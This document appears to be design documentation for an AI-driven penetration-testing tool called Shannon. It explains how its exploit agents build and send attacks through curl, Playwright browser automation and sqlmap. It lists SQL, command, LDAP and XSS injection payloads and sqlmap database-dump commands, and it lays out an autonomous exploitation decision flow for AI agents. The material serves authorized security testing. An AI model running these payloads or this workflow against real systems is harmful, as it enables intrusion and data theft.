# Payload Creation & Sending Mechanisms

**Document Version:** 1.0  
**Last Updated:** 2025-02-02  
**Purpose:** Detailed documentation of Shannon's payload creation and HTTP request sending mechanisms

---

## Table of Contents

1. [Three-Tier Payload Architecture](#three-tier-payload-architecture)
2. [Payload Creation: Prompt-Based Instructions](#payload-creation-prompt-based-instructions)
3. [Payload Sending: HTTP Request Mechanisms](#payload-sending-http-request-mechanisms)
4. [Exploitation Decision Flow](#exploitation-decision-flow)
5. [Payload Creation by Vulnerability Type](#payload-creation-by-vulnerability-type)
6. [MCP Server Architecture for Exploitation](#mcp-server-architecture-for-exploitation)
7. [Key Files Reference](#key-files-reference)

---

## Three-Tier Payload Architecture

Shannon's exploitation agents use a **multi-modal payload delivery system** with three primary mechanisms:

**Tier 1: Manual HTTP Requests (Bash + curl)**
- Use Case: Simple one-off payloads, quick testing
- Tool: Bash tool with curl commands
- Example: `curl -X POST "https://target.com/login" -d "username=admin' OR '1'='1"`
- File Reference: prompts/exploit-injection.txt (lines 190-370)

**Tier 2: Browser Automation (Playwright MCP)**
- Use Case: Complex multi-step attacks, cookie handling
- Tool: Playwright MCP server (agent-specific instances)
- MCP Assignment: src/constants.ts:35-62 (MCP_AGENT_MAPPING)
- File Reference: prompts/exploit-xss.txt (lines 200-280)

**Tier 3: Automated Tooling (sqlmap + Task Agent)**
- Use Case: Systematic enumeration, automated exploitation
- Tools: Bash (sqlmap), Task Agent (custom scripts)
- File Reference: prompts/exploit-injection.txt (lines 310-360)

---

## Payload Creation: Prompt-Based Instructions

### File: prompts/exploit-injection.txt

**Payload Creation Methodology (lines 190-370):**

**Step 1: Confirmation**
- SQL Injection: `' OR '1'='1`
- Command Injection: `; whoami`
- LDAP Injection: `*)(uid=*)`

**Step 2: Fingerprinting**
```bash
curl -X POST "https://target.com/api/users" \
  -d "id=1' AND 1=CONVERT(int, (SELECT @@version)) --"
```

**Step 3: Enumeration**
```bash
sqlmap -u "https://target.com/api/users?id=1" --batch --tables --dbms=mysql
```

**Step 4: Exfiltration**
```bash
sqlmap -u "https://target.com/api/users?id=1" --batch --dump --format=CSV
```

**Task Agent Workflow (lines 310-360):**
1. Create tasks for each vulnerability
2. For each task: craft payload, send request, save evidence
3. Consolidate evidence into exploitation_evidence.md

### File: prompts/exploit-xss.txt

**Payload Strategy (lines 200-280):**

1. **Confirmation Payloads**
   - `<script>alert(1)</script>`
   - `<img src=x onerror=alert(1)>`

2. **Bypass Techniques:**
   - URL encoding: `%3Cscript%3Ealert(1)%3C/script%3E`
   - Tag-based: `<svg onload=alert(1)>`
   - Attribute-based: `" autofocus onfocus=alert(1) x="`

---

## Payload Sending: HTTP Request Mechanisms

### Mechanism 1: Bash Tool + curl

**Usage:** Simple exploitation, full control over HTTP requests

**Example:**
```bash
curl -X POST "https://target.com/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'"'"' OR '"'"'1'"'"'='"'"'1"}' \
  -v
```

### Mechanism 2: Playwright MCP Server

**Configuration Files:**
- `src/constants.ts:35-62` - MCP_AGENT_MAPPING
- `mcp-server/src/index.ts` - MCP server factory
- `src/ai/claude-executor.ts:61-95` - MCP assignment logic

**MCP Agent Mapping:**
```typescript
export const MCP_AGENT_MAPPING = {
  'exploit-injection': 'playwright-agent1',
  'exploit-xss': 'playwright-agent2',
  'exploit-auth': 'playwright-agent3',
  'exploit-ssrf': 'playwright-agent4',
  'exploit-authz': 'playwright-agent5',
};
```

**Execution Flow:**
1. Agent starts → prompt loaded with {{MCP_SERVER}} variable
2. assignMcpServers() creates Playwright instance
3. Agent uses tools: browser_navigate, browser_type, browser_click
4. Evidence captured via browser_take_screenshot()

### Mechanism 3: Automated Tooling (sqlmap)

**Usage:** Systematic SQL injection enumeration

**Example:**
```bash
sqlmap -u "https://target.com/api/users?id=1" \
  --batch --dbms=mysql --level=5 --risk=3 --dbs
```

**Key Flags:**
- `--batch` - Non-interactive mode
- `--level=5` - More payloads (max 5)
- `--risk=3` - Riskier tests (max 3)
- `--dump` - Extract data

---

## Exploitation Decision Flow

```
Exploit Agent Starts
  ↓
Read exploitation queue
  ↓
For each vulnerability:
  ↓
  Is SQL injection confirmed?
    ├─ YES → Use sqlmap (automated)
    └─ NO → Check complexity
           ├─ Simple → Use curl
           └─ Complex → Use Playwright
  ↓
Execute exploitation
  ↓
Capture evidence (response, screenshot, data dump)
  ↓
Save evidence via save_deliverable()
  ↓
Update verdict in queue (EXPLOITED / NOT_EXPLOITED)
```

---

## Payload Creation by Vulnerability Type

| Vulnerability | Primary Mechanism | Secondary | Reference |
|---------------|-------------------|-----------|-----------|
| SQL Injection | sqlmap | curl | exploit-injection.txt:310-350 |
| Command Injection | curl | Task Agent | exploit-injection.txt:190-250 |
| XSS | Playwright | curl | exploit-xss.txt:200-280 |
| SSRF | curl | Playwright | exploit-ssrf.txt:150-200 |
| Auth Bypass | Playwright | curl | exploit-auth.txt:180-230 |
| Authz Bypass | Playwright | curl | exploit-authz.txt:190-240 |

---

## MCP Server Architecture for Exploitation

**In-Process MCP Servers (per workflow):**
- shannon-helper
  - save_deliverable tool
  - generate_totp tool

**External MCP Servers (per agent, isolated):**
- playwright-agent1 through playwright-agent5
  - Dedicated to specific exploit agents
  - User data dir: /tmp/playwright-agent[N]
  - No cookie conflicts between agents

**Benefits:**
- No cookie conflicts
- Parallel execution without interference
- Isolated browser sessions

---

## Key Files Reference

| File Path | Purpose |
|-----------|---------|
| prompts/exploit-injection.txt | Injection exploitation instructions |
| prompts/exploit-xss.txt | XSS exploitation instructions |
| prompts/exploit-auth.txt | Auth bypass instructions |
| prompts/exploit-ssrf.txt | SSRF exploitation instructions |
| prompts/exploit-authz.txt | Authorization bypass instructions |
| src/constants.ts:35-62 | MCP_AGENT_MAPPING configuration |
| mcp-server/src/index.ts | MCP server factory |
| src/ai/claude-executor.ts:61-95 | MCP server assignment logic |
| src/temporal/activities.ts:337-355 | Exploit agent activity wrappers |

---

**END OF DOCUMENT**
